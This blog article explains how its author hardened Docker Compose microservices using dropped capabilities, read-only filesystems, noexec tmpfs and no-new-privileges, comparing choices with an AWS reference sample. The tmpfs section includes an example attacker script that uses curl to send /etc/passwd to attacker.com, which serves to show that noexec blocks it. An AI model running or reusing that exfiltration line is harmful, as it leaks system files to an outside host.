# Container Security in Docker Compose: How I Hardened a Microservices Project from Day One

Most developers treat container security as something to add later — after the app works, after the deadline, after the next sprint. I took the opposite approach when building my Guitar Shop microservices project: security was a requirement from the first line of Docker Compose config.

This article walks through four specific hardening techniques I applied, why I chose each one, and how they differ across stateless application services versus stateful database services.

---

## The Project

The Guitar Shop is a microservices application made up of 5 services:

- **catalog** — Go service, talks to MySQL
- **cart** — Java/Spring Boot, talks to Redis
- **checkout** — Node.js, talks to PostgreSQL and RabbitMQ
- **orders** — Java/Spring Boot, talks to PostgreSQL and RabbitMQ
- **ui** — Java/Spring Boot, aggregates all services

Plus 5 infrastructure services: MySQL, PostgreSQL (x2), Redis, and RabbitMQ.

The reference I used to study production patterns was the [AWS retail-store-sample](https://github.com/aws-containers/retail-store-sample-app) — a publicly available microservices reference from AWS. Comparing my decisions to theirs taught me a lot about intentional security choices.

---

## Technique 1: Linux Capabilities (cap_drop / cap_add)

### What are Linux capabilities?

Linux capabilities break the traditional all-or-nothing root privilege model into granular units. Instead of a process being either fully privileged (root) or unprivileged (non-root), capabilities let you grant specific powers:

- `NET_BIND_SERVICE` — bind to network ports
- `CHOWN` — change file ownership
- `SETUID` / `SETGID` — change process user/group
- `SYS_ADMIN` — broad system administration (essentially root)

By default, Docker containers start with approximately 14 capabilities — far more than most applications need.

### The pattern

```yaml
cap_drop:
  - ALL
cap_add:
  - NET_BIND_SERVICE
```

Drop everything first. Then add back only what the application actually requires. This is the principle of least privilege applied at the kernel level.

### How do you know which capabilities to add back?

Run the container with `cap_drop: ALL` and see what breaks. The error messages tell you exactly what's missing:

**Binding to port 80:**
```
permission denied
```
→ Add `NET_BIND_SERVICE`

**Changing file ownership:**
```
operation not permitted
```
→ Add `CHOWN`

### Why NET_BIND_SERVICE specifically?

My services currently run on port 8080. Technically `NET_BIND_SERVICE` is only required for ports below 1024 like 80 and 443. Port 8080 doesn't need it.

But this project is built to move to production. Adding `NET_BIND_SERVICE` now means zero config changes when services are reconfigured to run on standard ports. It follows the same reasoning as the AWS retail-store-sample, which also includes it on Java and Node.js services.

### Stateless vs stateful: why databases are different

All five of my microservices are stateless application servers. They receive HTTP requests, talk to databases, and return responses. They don't manage files or modify system permissions — so `NET_BIND_SERVICE` is the only capability they need.

Database containers are different. In the AWS retail-store-sample, the DynamoDB local container requires:

```yaml
carts-db:
  cap_add:
    - CHOWN
    - SETGID
    - SETUID
```

This is because the database process needs to manage file ownership on its data directory — changing which user owns the data files, managing group IDs. That's system-level work that stateless app servers never do.

For my MySQL and PostgreSQL containers I chose not to apply `cap_drop` at all. Official database images expect their default capabilities to be available. Getting it wrong silently breaks data directory initialization in ways that are hard to debug.

---

## Technique 2: Read-Only Filesystem

```yaml
read_only: true
```

This single line makes the entire container filesystem read-only. The running process cannot write, create, or modify any file on disk.

### Why this matters

Without it, an attacker who achieves code execution inside your container can:
- Write malware to disk that persists across requests
- Replace application binaries
- Create cron jobs or backdoors
- Write web shells

With `read_only: true`, all of the above are blocked at the filesystem level. The attacker can execute code but cannot persist anything. When the container restarts, it's clean.

### The trade-off

Many applications write temp files at runtime. With a read-only filesystem, those writes fail and the application crashes. This is solved by `tmpfs` (covered next).

I applied `read_only: true` to all five microservices. I did not apply it to databases — they must write data to their volumes to function.

---

## Technique 3: Tmpfs for /tmp

```yaml
tmpfs:
  - /tmp:rw,noexec,nosuid
```

`tmpfs` mounts `/tmp` in RAM rather than on disk. It exists only for the lifetime of the container and is never written to the host filesystem.

The three flags are each doing important work:

| Flag | What it does |
|---|---|
| `rw` | Allows the application to write temp files (required) |
| `noexec` | Prevents any file in /tmp from being executed as a program |
| `nosuid` | Ignores setuid/setgid bits on files in /tmp |

### Why noexec matters

Without `noexec`, an attacker who can write to `/tmp` can write a shell script or binary and execute it. With `noexec`, the write succeeds but execution is blocked by the kernel.

```bash
# Attacker writes a script to /tmp
echo '#!/bin/sh\ncurl attacker.com/exfil?data=$(cat /etc/passwd)' > /tmp/exfil.sh
chmod +x /tmp/exfil.sh

# Execution is blocked
/tmp/exfil.sh
# -bash: /tmp/exfil.sh: Permission denied
```

### The combination that matters

`read_only: true` and `tmpfs` work together:

```
read_only: true    → blocks writes everywhere on disk
tmpfs /tmp         → gives back a writable space in RAM
noexec             → ensures that writable space can't become an execution sandbox
```

Remove any one of these and the defense weakens.

---

## Technique 4: No New Privileges

```yaml
security_opt:
  - no-new-privileges:true
```

This is a kernel-level instruction that says: this process and every child it spawns can never gain more privileges than it started with. Ever.

### The attack it closes

Even when a container runs as a non-root user, Linux has a mechanism called `setuid` that can temporarily grant elevated privileges. If a binary inside the container has the setuid bit set, executing it can elevate the process to root.

```bash
# Without no-new-privileges:true
ls -la /usr/bin/sudo
# -rwsr-xr-x  (setuid bit is set)

# Running sudo can elevate the non-root process
sudo su -
# root@container
```

With `no-new-privileges:true`, the kernel ignores the setuid bit entirely. No escalation is possible regardless of what binaries exist in the image.

### Why I applied it to databases too

Unlike `cap_drop` and `read_only`, I applied `no-new-privileges:true` to all services including databases and RabbitMQ.

The reason: official database images may contain setuid binaries for administrative tools. Blocking privilege escalation on infrastructure containers costs nothing and closes a real attack vector. Even if an attacker compromises a database container, they cannot escalate to root.

---

## How the Four Techniques Work Together

```
cap_drop: ALL         → limits what the process can do (kernel capabilities)
read_only: true       → limits where it can write (filesystem)
no-new-privileges     → limits how it can escalate (privilege model)
tmpfs noexec          → limits what it can execute from writable memory
```

Each one closes a different attack vector. An attacker who bypasses one still faces the others.

This is defense in depth — not relying on any single control.

---

## Comparing My Approach to AWS retail-store-sample

The retail-store-sample is selective — it applies these controls only where each image was tested to support them:

| Service | cap_drop | cap_add | read_only | no-new-privs | tmpfs |
|---|---|---|---|---|---|
| cart (Java) | ALL | NET_BIND_SERVICE | yes | yes | yes |
| catalog (Go) | ALL | none | no | yes | no |
| checkout (Node) | ALL | NET_BIND_SERVICE | yes | no | yes |
| orders (Java) | ALL | NET_BIND_SERVICE | yes | yes | yes |
| ui (Java) | ALL | none | no | no | no |

My approach applies all four controls uniformly to every microservice. This is slightly less precise but simpler to maintain — any new service added to the project gets the same baseline security automatically.

---

## The Full Config for One Service

```yaml
cart:
  build:
    context: ./microservices/cart
    dockerfile: Dockerfile
  container_name: guitarshop-cart
  environment:
    REDIS_HOST: cart-redis
    REDIS_PORT: "6379"
  depends_on:
    cart-redis:
      condition: service_healthy
  networks:
    - guitarshop-net
  restart: always
  cap_add:
    - NET_BIND_SERVICE
  cap_drop:
    - ALL
  read_only: true
  security_opt:
    - no-new-privileges:true
  tmpfs:
    - /tmp:rw,noexec,nosuid
  healthcheck:
    test: ["CMD-SHELL", "wget -qO- http://localhost:8080/cart/health || exit 1"]
    interval: 10s
    timeout: 5s
    retries: 5
    start_period: 30s
```

---

## References

- Docker security best practices: https://docs.docker.com/engine/security/
- Linux capabilities reference: https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities
- security_opt reference: https://docs.docker.com/reference/compose-file/services/#security_opt
- tmpfs mounts: https://docs.docker.com/engine/storage/tmpfs/
- AWS retail-store-sample: https://github.com/aws-containers/retail-store-sample-app
